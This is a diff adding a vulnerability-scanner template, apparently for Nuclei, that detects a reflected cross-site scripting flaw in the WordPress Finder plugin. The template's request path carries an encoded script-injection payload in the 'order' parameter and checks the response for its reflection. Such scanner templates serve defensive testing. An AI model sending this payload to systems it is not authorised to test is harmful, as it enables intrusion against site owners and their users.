@@ -1,0 +1,24 @@
+id: wp-finder-xss
+info:
+  author: daffainfo
+  name: WordPress Plugin Finder - 'order' Reflected Cross-Site Scripting (XSS)
+  reference: https://www.securityfocus.com/bid/55217/info
+  severity: medium
+  tags: wordpress,xss,wp-plugin
+requests:
+- matchers:
+  - part: body
+    type: word
+    words:
+    - <script>alert(123);</script>
+  - part: header
+    type: word
+    words:
+    - text/html
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/wp-content/plugins/finder/index.php?by=type&dir=tv&order=%22%3E%3Cscript%3Ealert(123);%3C/script%3E'
